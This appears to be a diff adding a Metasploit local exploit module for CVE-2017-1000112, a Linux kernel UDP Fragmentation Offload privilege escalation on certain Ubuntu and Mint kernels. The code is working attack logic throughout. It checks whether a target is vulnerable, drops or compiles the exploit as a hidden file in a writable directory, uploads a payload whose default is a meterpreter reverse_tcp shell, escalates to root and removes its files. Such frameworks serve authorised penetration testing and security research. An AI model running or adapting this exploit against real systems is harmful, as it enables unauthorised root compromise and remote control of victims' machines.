@@ -1,0 +1,197 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+  include Msf::Post::Linux::Kernel
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Linux Kernel UDP Fragmentation Offset (UFO) Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on Linux systems by abusing
+        UDP Fragmentation Offload (UFO).
+
+        This exploit targets only systems using Ubuntu (Trusty / Xenial) kernels
+        4.4.0-21 <= 4.4.0-89 and 4.8.0-34 <= 4.8.0-58, including Linux distros
+        based on Ubuntu, such as Linux Mint.
+
+        The target system must have unprivileged user namespaces enabled
+        and SMAP disabled.
+
+        Bypasses for SMEP and KASLR are included. Failed exploitation
+        may crash the kernel.
+
+        This module has been tested successfully on various Ubuntu and Linux
+        Mint systems, including:
+
+        Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop;
+        Ubuntu 16.04 4.8.0-53-generic;
+        Linux Mint 17.3 4.4.0-89-generic;
+        Linux Mint 18 4.8.0-58-generic
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Andrey Konovalov', # Discovery and C exploit
+          'h00die',           # Metasploit module
+          'Brendan Coles'     # Metasploit module
+        ],
+      'DisclosureDate' => 'Aug 10 2017',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'Privileged'     => true,
+      'References'     =>
+        [
+          [ 'CVE', '2017-1000112' ],
+          [ 'EDB', '43418' ],
+          [ 'BID', '100262' ],
+          [ 'URL', 'http://seclists.org/oss-sec/2017/q3/277' ],
+          [ 'URL', 'https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c' ],
+          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=85f1bd9a7b5a79d5baa8bf44af19658f7bf77bfa' ],
+          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/CVE-2017-1000112' ],
+          [ 'URL', 'https://securingtomorrow.mcafee.com/mcafee-labs/linux-kernel-vulnerability-can-lead-to-privilege-escalation-analyzing-cve-2017-1000112/' ],
+          [ 'URL', 'https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html' ],
+          [ 'URL', 'https://github.com/bcoles/kernel-exploits/commits/cve-2017-1000112' ]
+        ],
+      'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
+      'DefaultTarget'  => 0))
+    register_options [
+      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ]),
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+  end
+
+  def upload_and_chmodx(path, data)
+    upload path, data
+    cmd_exec "chmod +x '#{path}'"
+  end
+
+  def upload_and_compile(path, data)
+    upload "#{path}.c", data
+
+    gcc_cmd = "gcc -o #{path} #{path}.c"
+    if session.type.eql? 'shell'
+      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
+    end
+    output = cmd_exec gcc_cmd
+    rm_f "#{path}.c"
+
+    unless output.blank?
+      print_error output
+      fail_with Failure::Unknown, "#{path}.c failed to compile"
+    end
+
+    cmd_exec "chmod +x #{path}"
+  end
+
+  def exploit_data(file)
+    path = ::File.join Msf::Config.data_directory, 'exploits', 'cve-2017-1000112', file
+    fd = ::File.open path, 'rb'
+    data = fd.read fd.stat.size
+    fd.close
+    data
+  end
+
+  def live_compile?
+    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')
+
+    if has_gcc?
+      vprint_good 'gcc is installed'
+      return true
+    end
+
+    unless datastore['COMPILE'].eql? 'Auto'
+      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'
+    end
+  end
+
+  def check
+    version = kernel_release
+    unless version =~ /^4\.4\.0-(21|22|24|28|31|34|36|38|42|45|47|51|53|57|59|62|63|64|66|67|70|71|72|75|78|79|81|83|87|89|81|89)-generic/ ||
+           version =~ /^4\.8\.0-(34|36|39|41|45|46|49|51|52|53|54|56|58)-generic/
+      vprint_error "Linux kernel version #{version} is not vulnerable"
+      return CheckCode::Safe
+    end
+    vprint_good "Linux kernel version #{version} is vulnerable"
+
+    vprint_status 'Checking if SMAP is enabled ...'
+    if smap_enabled?
+      vprint_error 'SMAP is enabled'
+      return CheckCode::Safe
+    end
+    vprint_good 'SMAP is not enabled'
+
+    arch = kernel_hardware
+    unless arch.include? 'x86_64'
+      vprint_error "System architecture #{arch} is not supported"
+      return CheckCode::Safe
+    end
+    vprint_good "System architecture #{arch} is supported"
+
+    unless userns_enabled?
+      vprint_error 'Unprivileged user namespaces are not permitted'
+      return CheckCode::Safe
+    end
+    vprint_good 'Unprivileged user namespaces are permitted'
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    unless check == CheckCode::Appears
+      fail_with Failure::NotVulnerable, 'Target not vulnerable! punt!'
+    end
+
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
+    unless cmd_exec("test -w '#{base_dir}' && echo true").include? 'true'
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    # Upload exploit executable
+    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
+    executable_path = "#{base_dir}/#{executable_name}"
+    if live_compile?
+      vprint_status 'Live compiling exploit on system...'
+      upload_and_compile executable_path, exploit_data('exploit.c')
+    else
+      vprint_status 'Dropping pre-compiled exploit on system...'
+      upload_and_chmodx executable_path, exploit_data('exploit.out')
+    end
+
+    # Upload payload executable
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    # Launch exploit
+    print_status 'Launching exploit ...'
+    output = cmd_exec "echo '#{payload_path} & exit' | #{executable_path}"
+    output.each_line { |line| vprint_status line.chomp }
+    print_status "Cleaning up #{payload_path} and #{executable_path} ..."
+    rm_f executable_path
+    rm_f payload_path
+  end
+end
